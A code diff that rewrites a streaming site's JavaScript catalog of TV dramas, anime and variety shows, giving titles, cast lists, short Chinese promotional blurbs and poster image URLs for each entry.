+      { id: "lj9", category: "luju", title: "把黑夜點燃", quality: "更新第07集", meta: "蔣訢, 陳哲遠, 任重, 張國強", desc: "兩代人民警察跨越二十年的接力追凶，面對隱匿在黑夜中的狡黠罪惡，用生命信仰照亮正義光芒。", posterUrl: fixImg("/upload/vod/20261015-1/af7dbab49019086531e510199d1ed527.webp") },
+      { id: "lj10", category: "luju", title: "蒸蒸日上", quality: "第22集已完結", meta: "高葉, 韓東君", desc: "北方傳統麵食館在現代連鎖餐飲衝擊下的守正創新，暖心市井煙火氣刻畫動人親情與奮鬥。", posterUrl: fixImg("/upload/vod/20261010-1/bc6b278976c9ebce64eb66e9979891e0.webp") },
+      { id: "lj11", category: "luju", title: "廚娘2026", quality: "全35集", meta: "周甯, 程遠", desc: "現代御廚傳人意外穿越時空，以一勺一鑊征服宮廷挑剔味蕾，收穫專屬御廚傳奇榮光。", posterUrl: fixImg("/upload/vod/20261008-1/0cc897b9110b1c05dd0fa96dff249039.jpg") },
+      { id: "lj12", category: "luju", title: "我不是大師", quality: "全24集", meta: "李現, 魏千翔, 果靖霖, 梁天", desc: "都市小人物陰差陽錯被捧為風水大師，啼笑皆非的巧合下用現代科學與熱心破除民間迷信詐騙。", posterUrl: fixImg("/upload/vod/20261008-1/27ec85a9339d0a7f2c507cab67baf9b0.jpg") },
 
-      // 3. 人氣動漫
-      { id: "a1", category: "anime", title: "膽大黨 第二季", rating: "9.9", quality: "繁中同步", meta: "幽靈VS外星人 狂氣續作", isLive: false, posterUrl: "https://blog.shopping.gamania.com/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2F3wl0vtkq%2Fproduction%2F9545e7ad3e23e714ac79f3e72307d3eb5f64e515-900x1125.jpg&w=1920&q=75", bg: "linear-gradient(135deg, #2D0F3F, #0E0317)" },
-      { id: "a2", category: "anime", title: "JOJO：飆馬野郎", rating: "9.9", quality: "4K原畫", meta: "SBR橫跨北美 大賽啟動", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSsfk6GoD5ETVqsx3d8XNIb3GLAZumMSptuyHbScnVzDg&s=10", bg: "linear-gradient(135deg, #381E0C, #140902)" },
-      { id: "a3", category: "anime", title: "邊緣行者 第二季", rating: "9.8", quality: "4K杜比", meta: "夜城狂想 扳機社火力全開", isLive: false, posterUrl: "https://p2.bahamut.com.tw/B/2KU/54/f5f1f6cd4bfb0d6036cd0bfaf31z88m5.JPG?v=1782706383579", bg: "linear-gradient(135deg, #0E253A, #030D14)" },
-      { id: "a4", category: "anime", title: "轉生史萊姆 第四季", rating: "9.7", quality: "繁中首播", meta: "萌王利姆路 魔王擴張篇", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJ3dPyjO8-8_Rradq5FPr0XFgsjSDL5etCZPV1eYfCkw&s=10", bg: "linear-gradient(135deg, #132A24, #040F0C)" },
-      { id: "a5", category: "anime", title: "無職轉生 第三季", rating: "9.8", quality: "原畫連載", meta: "魯迪烏斯 青年篇決戰", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTITNUPMmvmiPimdFyUjMttVuZtlpYqYFPg7KbSj3UgnQ&s=10", bg: "linear-gradient(135deg, #21132B, #09030E)" },
-      { id: "a6", category: "anime", title: "Re:從零開始 第四季", rating: "9.8", quality: "無修繁中", meta: "菜月昴 死亡回歸極限救贖", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSibL2j3nF1Ac0lChfKzp4DxQpP4eI2m3O9QzjPP9LzlA&s=10", bg: "linear-gradient(135deg, #380808, #140202)" },
-      { id: "a7", category: "anime", title: "怪獸 8 號 第二季", rating: "9.6", quality: "全集熱映", meta: "日比野卡夫卡 防衛隊決戰", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ-nn999Xlu_8u07Os9K538SqUkM-wZWkR6l6VZVY9TIg&s=10", bg: "linear-gradient(135deg, #1C2418, #070D05)" },
-      { id: "a8", category: "anime", title: "我獨自升級 最終章", rating: "9.9", quality: "4K旗艦版", meta: "暗影君王 統御萬千陰影", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTz14imu5u_HIIeAKyawI8b9UNhTXZcU3nsVoS_5_Rj8lfSoX2t3dwxfg8&s=10", bg: "linear-gradient(135deg, #242416, #0C0C05)" },
+      // 3. 熱播電視劇（全 32 部合併）
+      { id: "t1", category: "tvseries", title: "百萬人推理", quality: "4K全集", meta: "鄭伊健, 李霈瑜, 婁峻碩", desc: "網路連續離奇命案引爆全台猜疑，網紅偵探團與資深刑警聯手在百萬網民圍觀下抽絲剝繭緝拿真兇。", posterUrl: "https://upload.wikimedia.org/wikipedia/zh/7/7d/MillionFollowerDetectivePoster.jpg" },
+      { id: "t2", category: "tvseries", title: "凶宅專賣店", quality: "4K首播", meta: "李銘順, 范少勳, 陳姸霏", desc: "專接特殊凶宅買賣的神秘房仲團隊，走入一間間凶案現場為亡者解開心結，靈異與溫情交織的口碑神作。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQf5ldPO31Js70cj4p28OEjlLF2YGbxC6JbP51f7HhWDg&s=10" },
+      { id: "t3", category: "tvseries", title: "沉默的審判", quality: "4K同步", meta: "阮經天, 王淨, 張孝全", desc: "司法黑金黑幕重重，青年檢察官與熱血刑警頂住體制重壓，在無人發聲的法庭上掀起正義風暴。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQKCgq_XF7NIfOeStSjPs7_fERo45-E01d93c_Z3jcpjw&s=10" },
+      { id: "t4", category: "tvseries", title: "欠妳的那場婚禮", quality: "4K旗艦", meta: "張孝全, 蘇慧倫, 謝盈萱", desc: "跨越二十年的虐心眷戀！校園時期的遺憾諾言在成年人相聚時再次掀起波瀾，探討愛與釋懷的深情之作。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRCGMuJ7JlJxXU95-CUY5PkSRIj4vXP7I9SXTXF8c8t4Q&s=10" },
+      { id: "t5", category: "tvseries", title: "何百芮的地獄戀曲", quality: "繁中超清", meta: "郭書瑤, 黑色幽默喜劇", desc: "都會失婚女子爆笑自救日記！在荒謬職場與感情地獄中跌跌撞撞，笑中帶淚引爆全網當代社畜強烈共鳴。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTZxeymkOSz2wgUplzyGBfuQgX9wTSbaaUug2iW15mUYA&s=10" },
+      { id: "t6", category: "tvseries", title: "同棲散策", quality: "全劇免扣點", meta: "言承旭, 林依晨, 姚淳耀", desc: "長跑十年的同居伴侶直面柴米油鹽與激情消退，當第三者闖入生活，愛情的邊界該如何守護或告別。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSjH4q74i5pCKjcvaAMdxlnX9mY0K00Hq2aEwohkNoG1g&s=10" },
+      { id: "t7", category: "tvseries", title: "都市開基祖", quality: "原音首播", meta: "莊凱勛, 鍾瑶, 陳竹昇", desc: "台灣在地土地開發歷史的波瀾壯闊！小人物在都市擴張浪潮中守護祖產與家族榮譽的熱血奮鬥傳奇。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYa5_dhO9wCr_FlT5vhc9AnySCLoiS0mdw-0ekqN0KeA&s=10" },
+      { id: "t8", category: "tvseries", title: "人生只租不賣", quality: "每週跟播", meta: "陳姸霏, 黃河, 林予晞", desc: "台北租屋青年的真實生活圖鑑！在幾坪小雅房裡互相取暖，面對漲租與夢想現實的殘酷抉擇堅定前行。", posterUrl: "https://apl-hamivideo.cdn.hinet.net/HamiVideo/getHamiVideoImg.php?imageId=sourceImages@2546105909_o_20260105161514.jpg" },
+      { id: "t9", category: "tvseries", title: "璀璨之城粵語", quality: "第5集", meta: "張智霖, 吳卓羲, 高海甯, 張曦雯", desc: "TVB年度旗艦港劇！金融家族爭產風暴席捲中環，兄弟反目與權謀暗戰一觸即發。", posterUrl: fixImg("/upload/vod/20261012-1/1a49f028e1d752e84f6e3b4962250027.webp") },
+      { id: "t10", category: "tvseries", title: "Doctor X：白色黑手黨時代", quality: "第4集", meta: "金智媛, 李姃垠, 孫賢周, 金宇錫", desc: "大門未知子精神續作，外科神醫直面跨國醫療黑金利益集團，在手術刀尖上救贖生死尊嚴。", posterUrl: fixImg("/upload/vod/20261009-1/83c6769a9a1928cddca34b55843e25a6.webp") },
+      { id: "t11", category: "tvseries", title: "地獄大狀", quality: "更新至第10集", meta: "林愷鈴, 魏濬笙, 楊樂文, 潘燦良", desc: "專接惡人官司的頂級大律師內心深藏不為人知的血海深仇，以惡制惡的司法復仇爽劇。", posterUrl: fixImg("/upload/vod/20261008-2/a35baf70192d1a61858981d119f0ebc3.webp") },
+      { id: "t12", category: "tvseries", title: "戀愛充電中", quality: "第10集完結", meta: "蔡秀彬, 金英光, 車優慜, 鄭在光", desc: "治癒系浪漫喜劇！身心俱疲的社畜在共享辦公室邂逅溫暖咖啡師，展開一段甜入心坎的互療之戀。", posterUrl: fixImg("/upload/vod/20261009-1/2423ef9c4ea1556c5a8c662c2b6498f4.webp") },
+      { id: "t13", category: "tvseries", title: "不是你的戀愛", quality: "更新第10集", meta: "徐康俊, 安恩真, 李周安, 趙雅蘭", desc: "男女主角在替好友牽線相親時互生情愫，理智與心動瘋狂拉扯的高段位成年人情感遊戲。", posterUrl: fixImg("/upload/vod/20261008-2/193bc9f9e1d1ff9ac8d562a2ea013009.jpg") },
+      { id: "t14", category: "tvseries", title: "百日謊言", quality: "第4集", meta: "金裕貞, 樸珍榮, 金賢珠, 李茂生", desc: "為期一百天的契約夫妻協議，背後是為了掩蓋一樁財閥命案真相，假戲真做的致命誘惑。", posterUrl: fixImg("/upload/vod/20261010-1/c8dadf8a26dfd68dacde5d286ea1b65f.webp") },
+      { id: "t15", category: "tvseries", title: "死有對証粵語", quality: "第25集已完結", meta: "王菲, 韓馬利, 吳若希, 韋家雄", desc: "法醫與重案刑警聯手破譯屍體密碼，每一個微小傷口都在為死者控訴真相，經典港味刑偵劇。", posterUrl: fixImg("/upload/vod/20261008-main/a559cf6628b75c9a6d4bf284c793a8b9caf15f905996f4451aee6d72a1547e44.jpg") },
+      { id: "t16", category: "tvseries", title: "中頭獎還是要上班", quality: "已完結", meta: "李濬赫, 徐現宇, 吳代煥, 玉子妍", desc: "小職員意外中得百億韓元彩票卻不敢離職，假裝社畜一邊在公司裝窮一邊整頓職場的爆笑爽劇。", posterUrl: fixImg("/upload/vod/20261008-1/04847df1e94db239a2356a1ef2131be8.jpg") },
+      { id: "t17", category: "tvseries", title: "風華令", quality: "更新第24集", meta: "李明軒, 陳意涵, 白澍, 安琪", desc: "女捕快攜手王府世子暗中查探前朝秘寶流向，在江湖刀劍與朝堂波譎中共同進退共赴白頭。", posterUrl: fixImg("/upload/vod/20261008-1/e853382c10809f65baf1859b4c2d3659.jpg") },
+      { id: "t18", category: "tvseries", title: "美國恐怖故事第十三季", quality: "第10集", meta: "約翰·卡洛·林奇, 莎拉·保羅森, 凱西·貝茨", desc: "原班人馬驚悚回歸！深層心理驚悚與美式超自然異象完美結合，第十三季全線解鎖深淵恐懼。", posterUrl: fixImg("/upload/vod/20261008-2/f6bc5d2f756b8a5665b0c66e8f2881a7.webp") },
+      { id: "t19", category: "tvseries", title: "心動制造所", quality: "更新至第04集", meta: "金宰永, 南志鉉, 薑泰洙", desc: "AI情感工程師與堅信純粹心動的婚介經理人在大數據配對與真實荷爾蒙碰撞中擦出火花。", posterUrl: fixImg("/upload/vod/20261015-1/66d9accd2cfc88835dab0344e4f0b04b.webp") },
+      { id: "t20", category: "tvseries", title: "郵票與舒芙蕾", quality: "第7集", meta: "陳意涵, 天心, 張孝全, 張榕容", desc: "台北街頭兩間甜品店與集郵社老闆的浪漫相遇，用烘焙的甜蜜治癒成年人世界的疲憊遺憾。", posterUrl: fixImg("/upload/vod/20261008-1/12c2a917587fda071ac2390180cf4664.jpg") },
 
-      // 4. 熱門綜藝
-      { id: "v1", category: "variety", title: "大嘻哈時代 3", rating: "9.9", quality: "4K首播", meta: "2026台灣最強饒舌選秀 頂尖選手巔峰對決", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSfINy_4PjUfCBRd12bLAFeYIedHov4iVdxZaLg4_ezwHYgDJdm9GzKmfc&s=10", bg: "linear-gradient(135deg, #2A0845, #0D0216)" },
-      { id: "v2", category: "variety", title: "綜藝玩很大 2026", rating: "9.8", quality: "全集跟播", meta: "憲哥領軍 跨海極限實境挑戰 笑料無極限", isLive: false, posterUrl: "https://www.iq.com/wiki/_next/image?url=https%3A%2F%2Fpic5.iqiyipic.com%2Fimage%2F20260221%2F31%2F52%2Fa_100020646_m_600_zh-CN_440_608.webp&w=3840&q=75", bg: "linear-gradient(135deg, #3A1C05, #140901)" },
-      { id: "v3", category: "variety", title: "小姐不熙娣 2026", rating: "9.8", quality: "繁中超清", meta: "小S犀利提問 2026台北都會爆笑八卦話題", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTInxFGYr5U-wjHIZTZLYDjBQVjztodmLhKbASYa6TE0lwIaBLSx9w5KpjN&s=10", bg: "linear-gradient(135deg, #3D1224, #14030A)" },
-      { id: "v4", category: "variety", title: "光露營就很忙了 2", rating: "9.7", quality: "4K原聲", meta: "華燈初上原班人馬 台灣野奢秘境療癒實境", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQACCanbpWcNpKG0b55NlOEbrv1Cet9sdzzb_e5UmsJ_w&s=10", bg: "linear-gradient(135deg, #152B1E, #05130A)" },
-      { id: "v5", category: "variety", title: "嗨！營業中 第四季", rating: "9.8", quality: "完整版免看廣告", meta: "主廚團隊集結 挑戰全台各地移動餐車極限", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7OzZBL7_O7Iy8spW4vfiRfvOWT9t5IOoI_KDUiM6_zA&s=10", bg: "linear-gradient(135deg, #332010, #140B04)" },
-      { id: "v6", category: "variety", title: "全民星攻略 2026", rating: "9.6", quality: "天天更新", meta: "曾國城 蔡尚樺 益智攻防智慧通識大考驗", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRyzgxz3L3sC1f0uarRePgwHqjNSOU3UKUYWq6zzmNRVA&s=10", bg: "linear-gradient(135deg, #142338, #050D17)" },
-      { id: "v7", category: "variety", title: "飢餓遊戲 2026", rating: "9.7", quality: "無修剪版", meta: "飢餓指數破表 孫協志 王仁甫 許孟哲實境", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcREl7MHT02JNZZJdUgLigQFV31smqjroAGWx1tVz5wapw&s=10", bg: "linear-gradient(135deg, #2D1B1B, #120909)" },
-      { id: "v8", category: "variety", title: "未來少女：進化世代", rating: "9.9", quality: "4K原畫質", meta: "台灣新世代女團選秀 燃炸舞台神曲連發", isLive: false, posterUrl: "https://upload.wikimedia.org/wikipedia/zh/d/df/Nextgirlzposter.png?utm_source=zh.wikipedia.org&utm_campaign=index&utm_content=original", bg: "linear-gradient(135deg, #3B0E2A, #14020D)" },
+      // 4. 人氣動漫（全 32 部合併）
+      { id: "a1", category: "anime", title: "膽大黨 第二季", quality: "繁中同步", meta: "幽靈VS外星人, 狂氣續作", desc: "狂氣戰鬥全面升級！幽靈靈媒少女與外星人狂熱少年聯手迎戰外星艦隊入侵，高幀作畫極致燃燒。", posterUrl: "https://blog.shopping.gamania.com/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2F3wl0vtkq%2Fproduction%2F9545e7ad3e23e714ac79f3e72307d3eb5f64e515-900x1125.jpg&w=1920&q=75" },
+      { id: "a2", category: "anime", title: "JOJO：飆馬野郎", quality: "4K原畫", meta: "SBR橫跨北美大賽", desc: "橫跨北美大陸的世紀賽馬拉力賽正式開跑！替身能力交鋒與神聖遺體爭奪戰，黃金精神在荒野激昂迴響。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSsfk6GoD5ETVqsx3d8XNIb3GLAZumMSptuyHbScnVzDg&s=10" },
+      { id: "a3", category: "anime", title: "邊緣行者 第二季", quality: "4K杜比", meta: "夜城狂想, 扳機社出品", desc: "夜之城的傳奇永遠不會終結！全新邊緣人在荒坂帝國的鐵蹄下發起絕命突擊，霓虹雨夜下的賽博浪漫。", posterUrl: "https://p2.bahamut.com.tw/B/2KU/54/f5f1f6cd4bfb0d6036cd0bfaf31z88m5.JPG?v=1782706383579" },
+      { id: "a4", category: "anime", title: "轉生史萊姆 第四季", quality: "繁中首播", meta: "萌王利姆路, 魔王擴張篇", desc: "魔國聯邦版圖進一步擴大！面對西方聖教會與東方帝國的雙重圍堵，利姆路率領部下展開戰略外交與強勢禦敵。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJ3dPyjO8-8_Rradq5FPr0XFgsjSDL5etCZPV1eYfCkw&s=10" },
+      { id: "a5", category: "anime", title: "無職轉生 第三季", quality: "原畫連載", meta: "魯迪烏斯, 青年篇決戰", desc: "魯迪烏斯步入青年關鍵轉折！直面人神的陰謀算計與龍神奧爾斯帝德的命運碰撞，守護摯愛家人的決戰來臨。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTITNUPMmvmiPimdFyUjMttVuZtlpYqYFPg7KbSj3UgnQ&s=10" },
+      { id: "a6", category: "anime", title: "Re:從零開始 第四季", quality: "無修繁中", meta: "菜月昴, 死亡回歸救贖", desc: "水門都市攻防戰白熱化！大罪司教全體集結，菜月昴無數次死亡輪迴中找尋通往唯一無損奇蹟的未來道路。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSibL2j3nF1Ac0lChfKzp4DxQpP4eI2m3O9QzjPP9LzlA&s=10" },
+      { id: "a7", category: "anime", title: "怪獸 8 號 第二季", quality: "全集熱映", meta: "日比野卡夫卡, 防衛隊決戰", desc: "超大型識別怪獸群席捲東京！日比野卡夫卡在隱藏怪獸身份與守護隊友之間奮力死戰，防衛隊終極武器解鎖。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ-nn999Xlu_8u07Os9K538SqUkM-wZWkR6l6VZVY9TIg&s=10" },
+      { id: "a8", category: "anime", title: "我獨自升級 最終章", quality: "4K旗艦版", meta: "暗影君王, 統御萬千陰影", desc: "君王戰爭全面爆發！成振宇率領億萬暗影軍團降臨凡間，直面毀滅君王的滅世天火，登頂宇宙至尊神座。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTz14imu5u_HIIeAKyawI8b9UNhTXZcU3nsVoS_5_Rj8lfSoX2t3dwxfg8&s=10" },
+      { id: "a9", category: "anime", title: "仙逆", quality: "更新第163集", meta: "史澤鯤, 常文濤, 林強, 周湘甯", desc: "耳根仙俠巔峰神作！凡人王林逆境修魔，順為凡逆則仙，一意修真殺伐果斷登臨極道。", posterUrl: fixImg("/upload/vod/20261008-1/979e78532033210035b7e54b6bbfbdc2.jpg") },
+      { id: "a10", category: "anime", title: "凡人脩仙傳", quality: "更新第196集", meta: "錢文青, 楊天翔, 楊默, 歪歪", desc: "山村窮小子韓立跨入仙門，以平凡資質步步為營，在弱肉強食的修仙界以謹慎智慧求證仙道。", posterUrl: fixImg("/upload/vod/20261008-2/ab61f7c71c70d5a350c4ee9bcf5e8632.jpg") },
+      { id: "a11", category: "anime", title: "牧神記", quality: "更新第105集", meta: "張若瑜, 李訢, 程玉珠, 杜晴晴", desc: "大墟殘老村養大的孤兒秦牧走出神棄之地，重啟天道神明法度，成為威震天下的牧神天尊。", posterUrl: fixImg("/upload/vod/20261018-main/16f5b9a2c31b5547d0423dd914c752c3a80009d69d6936b1d46552647debc9d9.jpg") },
+      { id: "a12", category: "anime", title: "鬭破蒼穹年番", quality: "更新第215集", meta: "不一, 陳奕雯, 黑石稔, 郭鴻博", desc: "三十年河東三十年河西！少年蕭炎吞噬天下異火，三上雲嵐宗激戰強敵，成就至尊鬥帝威名。", posterUrl: fixImg("/upload/vod/20261010-main/bd05d934da8667b26bd939744514a38130a1d9e242fc2e7baba602e627ab4878.jpg") },
+      { id: "a13", category: "anime", title: "女友的朋友", quality: "更新至第3集", meta: "永池瑠雅, 羽紫彩花, 長穀美希", desc: "話題度破表的情感新番！在女友與其神秘閨蜜之間難以割捨的情愫暗湧，展開心跳邊界試探。", posterUrl: fixImg("/upload/vod/20261008-2/2021e1f8d4f62e6962a4bc924f6a49fd.webp") },
+      { id: "a14", category: "anime", title: "光隂之外", quality: "第44集", meta: "耳根末世神作改編", desc: "神靈睜眼天地異變！少年許青在殘酷神殘血雨中艱難求存，以殺戮與冷靜步步崛起踏入光陰。", posterUrl: fixImg("/upload/vod/20261008-2/cf32e5ef7c55fdbe005dedf40810e239.jpg") },
+      { id: "a15", category: "anime", title: "妖神記第十季", quality: "已完結", meta: "囌尚卿, 柳知蕭, 張妮", desc: "最強妖靈師聶離攜時空妖靈書重生年少，扭轉宗門覆滅之局，帶領親友登臨武道神階巔峰。", posterUrl: fixImg("/upload/vod/20261008-main/6ba03113c43388fa99e4e786845928c340b44d56b77286ec708d5d7f344f94ba.webp") },
+      { id: "a16", category: "anime", title: "鬭羅大陸II絕世唐門", quality: "第175集", meta: "霍雨浩 魂靈新時代", desc: "唐門式微百年之後，霍雨浩覺醒靈眸武魂，開創魂靈契約時代，帶領新一代史萊克七怪重現榮耀。", posterUrl: fixImg("/upload/vod/20261008-main/9abc8e3e16339d2cf95eec85f36983f2a097830adfc418aa4f9752774e7b54fc.jpg") },
+      { id: "a17", category: "anime", title: "海賊王", quality: "更新至第1180集", meta: "田中真弓, 岡村明美, 中井和哉", desc: "草帽一夥駛入最終章未來島！五老星全面出動，古代歷史真相即將向全世界震撼揭曉！", posterUrl: fixImg("/upload/vod/20261008-1/d963d876cacd907ce8a8dc687f7becd8.jpg") },
+      { id: "a18", category: "anime", title: "吞噬星空", quality: "更新第245集", meta: "趙乾景, 謝瑩, 宋國慶, 張若瑜", desc: "大涅槃後地球武者羅峰獲得金角巨獸分身，踏足浩瀚宇宙星河，與萬族天驕爭奪宇宙霸權。", posterUrl: fixImg("/upload/vod/20261008-1/5912ac20beac2624409be6fc7b342628.jpg") },
+      { id: "a19", category: "anime", title: "遮天", quality: "第185集", meta: "徐翔, 趙乾景, 吳磊, 張若瑜", desc: "九龍拉棺震撼啟航！葉凡踏入浩瀚修真北斗星域，破荒古聖體詛咒，鎮壓萬族天驕問鼎仙路。", posterUrl: fixImg("/upload/vod/20261008-1/21988564829415c349e489dda2760474.jpg") },
+      { id: "a20", category: "anime", title: "武神主宰", quality: "第701集", meta: "許子堯, 唐澤宗, 陳帥", desc: "一代天驕秦塵遭摯愛背叛隕落，百年後神魂重生大齊國卑微廢柴，以逆天丹武神訣強勢復仇！", posterUrl: fixImg("/upload/vod/20261008-1/d23cdeb151c6c24916643410164251ab.jpg") },
 
-      // 5. 台灣地方電視台（含 LIVE 呼吸燈）
-      { id: "ch1", category: "channel", title: "TVBS 新聞台 55", rating: "9.9", quality: "1080P直播", meta: "全天候即時新聞 台灣重大時事直擊", isLive: true, posterUrl: "https://images.unsplash.com/photo-1585829365295-ab7cd400c167?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #11253B, #071321)" },
-      { id: "ch2", category: "channel", title: "東森新聞台 51", rating: "9.9", quality: "60幀直播", meta: "關鍵時刻 台灣在地第一手熱門報導", isLive: true, posterUrl: "https://images.unsplash.com/photo-1504711434969-e33886168f5c?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #2D1414, #120505)" },
-      { id: "ch3", category: "channel", title: "三立台灣台 29", rating: "9.8", quality: "HD原音", meta: "台灣本土八點檔連播 鄉親在地最愛", isLive: true, posterUrl: "https://images.unsplash.com/photo-1522869635100-9f4c5e86aa37?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #0B2B1B, #03120B)" },
-      { id: "ch4", category: "channel", title: "民視無線台 06", rating: "9.8", quality: "高清首選", meta: "本土黃金檔連續劇 在地綜藝第一線", isLive: true, posterUrl: "https://images.unsplash.com/photo-1461151304267-38535e780c79?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #1A1A3A, #07071A)" },
-      { id: "ch5", category: "channel", title: "緯來體育台 72", rating: "9.9", quality: "4K原畫質", meta: "CPBL中華職棒 NBA賽事全中文原音轉播", isLive: true, posterUrl: "https://images.unsplash.com/photo-1540747913346-19e32dc3e97e?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #331A05, #140A02)" },
-      { id: "ch6", category: "channel", title: "中天新聞台 (Live)", rating: "9.7", quality: "無延遲直播", meta: "熱門政論直球對決 台灣網路直播霸榜", isLive: true, posterUrl: "https://images.unsplash.com/photo-1495020689067-958852a7765e?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #21262B, #090B0D)" },
-      { id: "ch7", category: "channel", title: "公視主頻 PTS 13", rating: "9.9", quality: "純淨高畫質", meta: "台灣頂級旗艦大劇 深度文教紀錄片", isLive: true, posterUrl: "https://images.unsplash.com/photo-1518173946687-a4c8a383392e?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #2A1A33, #0F0714)" },
-      { id: "ch8", category: "channel", title: "東森綜合台 32", rating: "9.7", quality: "每晚同步", meta: "全民星攻略 小姐不熙娣 話題綜藝全收錄", isLive: true, posterUrl: "https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #3A2312, #140A04)" },
+      // 5. 熱門綜藝（全 32 部合併）
+      { id: "v1", category: "variety", title: "大嘻哈時代 3", quality: "4K首播", meta: "台灣最強選秀, 巔峰對決", desc: "全台最強饒舌選秀盛事！新銳選手押韻歌詞針鋒相對，導師陣容嚴苛點評，引爆嘻哈音樂潮流熱浪。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSfINy_4PjUfCBRd12bLAFeYIedHov4iVdxZaLg4_ezwHYgDJdm9GzKmfc&s=10" },
+      { id: "v2", category: "variety", title: "綜藝玩很大 2026", quality: "全集跟播", meta: "憲哥領軍, 跨海極限實境", desc: "吳宗憲親自領軍！全新跨海極限關卡挑戰體能與智力極限，黃黑兩隊火花四射，爆笑反轉驚喜不斷。", posterUrl: "https://www.iq.com/wiki/_next/image?url=https%3A%2F%2Fpic5.iqiyipic.com%2Fimage%2F20260221%2F31%2F52%2Fa_100020646_m_600_zh-CN_440_608.webp&w=3840&q=75" },
+      { id: "v3", category: "variety", title: "小姐不熙娣 2026", quality: "繁中超清", meta: "小S犀利提問, 都會八卦", desc: "小S犀利風格火力全開！邀請話題來賓暢聊兩性與演藝圈秘辛，辛辣幽默的訪談風格每期登上熱搜焦點。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTInxFGYr5U-wjHIZTZLYDjBQVjztodmLhKbASYa6TE0lwIaBLSx9w5KpjN&s=10" },
+      { id: "v4", category: "variety", title: "光露營就很忙了 2", quality: "4K原聲", meta: "華燈原班人馬, 野奢實境", desc: "林心如攜手《華燈初上》光之家族前往台灣野奢秘境露營，生火做飯暢聊人生，療癒放鬆的慢綜藝典範。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQACCanbpWcNpKG0b55NlOEbrv1Cet9sdzzb_e5UmsJ_w&s=10" },
+      { id: "v5", category: "variety", title: "嗨！營業中 第四季", quality: "完整版免廣告", meta: "移動餐車挑戰全台極限", desc: "明星合夥人挑戰全台移動餐車經營！深入市集面對嚴苛顧客評價與突發食材危機，呈現真實餐飲煙火氣。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7OzZBL7_O7Iy8spW4vfiRfvOWT9t5IOoI_KDUiM6_zA&s=10" },
+      { id: "v6", category: "variety", title: "全民星攻略 2026", quality: "天天更新", meta: "曾國城, 蔡尚樺, 益智考驗", desc: "曾國城主持的超高人氣益智搶答節目！多元生活通識與腦力攻防戰，各路明星嘉賓爭奪百萬大獎智慧爭鋒。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRyzgxz3L3sC1f0uarRePgwHqjNSOU3UKUYWq6zzmNRVA&s=10" },
+      { id: "v7", category: "variety", title: "飢餓遊戲 2026", quality: "無修剪版", meta: "飢餓指數破表, 實境對抗", desc: "孫協志、王仁甫、許孟哲主持！挑戰空腹極限換取充飢美食，殘酷無情的遊戲機制考驗成員飢餓生存本能。", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcREl7MHT02JNZZJdUgLigQFV31smqjroAGWx1tVz5wapw&s=10" },
+      { id: "v8", category: "variety", title: "未來少女：進化世代", quality: "4K原畫質", meta: "新世代女團選秀舞台", desc: "台灣新世代女團競演真人秀！頂尖練習生高強度舞台唱跳考核，爭奪年度唯一出道名額的熱血女團夢想。", posterUrl: "https://upload.wikimedia.org/wikipedia/zh/d/df/Nextgirlzposter.png" },
+      { id: "v9", category: "variety", title: "現在就出發第四季", quality: "更新至最新期", meta: "沈騰, 白敬亭, 王安宇, 賈冰", desc: "爆笑公路充電旅行！沈騰攜手原班兄弟團穿梭秘境山川，無包袱做遊戲帶來爆笑療癒名場面。", posterUrl: fixImg("/upload/vod/20261017-main/60afe1f687457ae1ba31548b069b8b4817ff88f45b6f81050cea090968855816.jpg") },
